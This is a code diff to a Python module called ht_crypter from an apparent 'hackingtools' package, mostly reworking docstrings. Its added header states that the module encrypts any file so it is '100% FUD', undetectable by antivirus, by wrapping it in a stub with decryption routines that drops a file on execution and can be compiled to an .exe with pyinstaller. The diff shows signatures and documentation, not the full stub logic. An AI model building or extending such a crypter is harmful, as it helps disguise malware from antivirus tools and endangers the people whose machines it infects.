@@ -1,3 +1,20 @@
+# === Crypts any file using ht_rsa module and some Utils. For now, is FUD 100% ===
+
+"""
+With this module, we can crypt any file we want 
+for not been detected, for example, by antiviruses.
+Currently it support's the following 2 public functions and 4 private functions:
+
+Public:
+
+1. **crypt_file** - Crypts any file with ht_rsa functions and some utils and returns crypted file 100% FUD (jump to section in [[ht_crypter.py#crypt_file]] )
+
+2. **createStub** - Creates a file with the stub (decrypt functions and pk for rsa) included into the file for been 100% FUD (jump to section in [[ht_crypter.py#createStub]] )
+
+#TODO MORE HEREEE
+
+"""
+
 from hackingtools.core import Logger, Config, Utils
 import hackingtools as ht 
 
@@ -11,23 +28,31 @@ import base64
 import binascii
 import random
 import shutil
+
 config = Config.getConfig(parentKey='modules', key='ht_crypter')
+output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
 
 class StartModule():
 
+# === __init__ ===
 	def __init__(self):
 		Logger.printMessage(message='ht_crypter loaded', debug_core=True)
-		pass
 
+# === help ===
 	def help(self):
 		Logger.printMessage(message=ht.getFunctionsNamesFromModule('ht_crypter'))
 
+# === convertToExe ===
 	def convertToExe(self, stub_name):
-		"""Convert's given Python file path in String into a new one with the same name and .exe as extension
+		"""
+		Convert's given Python file path in String into a new one with the same name and .exe as extension
 		Compile's with pyinstaller and could be change it's params in config.json
 		
-		Arguments:
-			stub_name {String} -- File path to convert to exe
+		Arguments
+		---------
+			stub_name : str
+				
+				File path to convert to exe
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='convertToExe'), description='{stub_name}'.format(stub_name=stub_name), debug_module=True)
 		# Convert py to exe with pyinstaller
@@ -56,32 +81,56 @@ class StartModule():
 		if os.path.isfile(spec_file):
 			os.remove(spec_file)
 
+# === clean_output_dir ===
 	def clean_output_dir(self):
-		"""Clean's the output.
+		"""
+		Clean's the output.
 		Is used for removing all bad files we don't want in our path if we want to upload after to Pypi
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='clean_output_dir'), debug_module=True)
-		output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'output'))
-		if os.path.isdir(output_dir):
-			shutil.rmtree(output_dir)
+		Utils.emptyDirectory(output_dir)
 
+# === createStub ===
 	def createStub(self, crypto_data_hex, public_key, drop_file_name, save_name, is_iterating=False, is_last=False, convert=False):
 		"""
-		Create's the stub for the crypter and has some courious params he have to see
+		Create's the stub for the crypter and 
+		has some courious params he have to see
 		
-		Arguments:
-			crypto_data_hex {String} -- File path that want to crypt
-			public_key {String} -- New File name for crypted file when return's it
-			drop_file_name {String} -- New File name for crypted file when return's it
-			save_name {String} -- New File name for crypted file when return's it
+		Arguments
+		---------
+			crypto_data_hex : str
+
+				File path that want to crypt
+			public_key : str
+			
+				New File name for crypted file when 
+				return's it
+			drop_file_name : str
+				New File name for crypted file when 
+				return's it
+			save_name : str
+				New File name for crypted file when 
+				return's it
 		
 		Keyword Arguments:
-			is_iterating {boolean} -- Compile's the final file if we select it (default: {False})
-			is_last {boolean} -- Internal variable for looping on the crypting (default: {False})
-			convert {boolean} -- Internal varuable for looping on the crypting (default: {1})
+			is_iterating : bool
+			
+				Compile's the final file if we select 
+				it (default: {False})
+			is_last : bool
+			
+				Internal variable for looping on the 
+				crypting (default: {False})
+			convert : bool
+				
+				Internal varuable for looping on the 
+				crypting (default: {1})
 		
-		Returns:
-			String -- Crypted file path name / None
+		Returns
+		-------
+			str
+			
+				Crypted file path name / None
 		"""
 		stub = ''
 		if is_last:
@@ -157,23 +206,53 @@ if os.path.exists(drpnm):
 		if convert:
 			self.convertToExe(save_name)
 
+# === crypt_file ===
 	def crypt_file(self, filename, new_file_name, drop_file_name='dropped.py', prime_length=4, compile_exe=False, is_iterating=False, iterate_count=1, is_last=False):
 		"""Crypt's a file when some params we have to use
 		
-		Arguments:
-			filename {String} -- File path that want to crypt
-			new_file_name {String} -- New File name for crypted file when return's it
+		Arguments
+		---------
+			filename : str
+			
+				File path that want to crypt
+			new_file_name : str
+			
+				New File name for crypted file 
+				when return's it
 		
-		Keyword Arguments:
-			drop_file_name {String} -- Drop a new file on execute the cryted file (default: {'dropped.py'})
-			prime_length {integer} -- Set a prime length for auto-generating the primes for the cryptography (default: {4})
-			compile_exe {boolean} -- Compile's the final file if we select it (default: {False})
-			is_iterating {boolean} -- Internal variable for looping on the crypting (default: {False})
-			iterate_count {integer} -- Internal varuable for looping on the crypting (default: {1})
-			is_last {boolean} -- Internal varuable for looping on the crypting (default: {False})
+		Keyword Arguments
+		-----------------
+			drop_file_name : str
+			
+				Drop a new file on execute the 
+				cryted file (default: {'dropped.py'})
+			prime_length : int
+			
+				Set a prime length for auto-generating
+				 the primes for the cryptography 
+				 (default: {4})
+			compile_exe : bool
+			
+				Compile's the final file if 
+				we select it (default: {False})
+			is_iterating : bool
+			
+				Internal variable for looping 
+				on the crypting (default: {False})
+			iterate_count : int
+			
+				Internal variable for looping 
+				on the crypting (default: {1})
+			is_last : bool
+			
+				Internal variable for looping 
+				on the crypting (default: {False})
 		
-		Returns:
-			String -- Crypted file path name / None
+		Returns
+		-------
+			str
+
+				Crypted file path name / None
 		"""
 		Logger.printMessage(message='{methodName}'.format(methodName='crypt_file'), description='{filename}'.format(filename=filename), debug_module=True)
 		temp_filename = filename
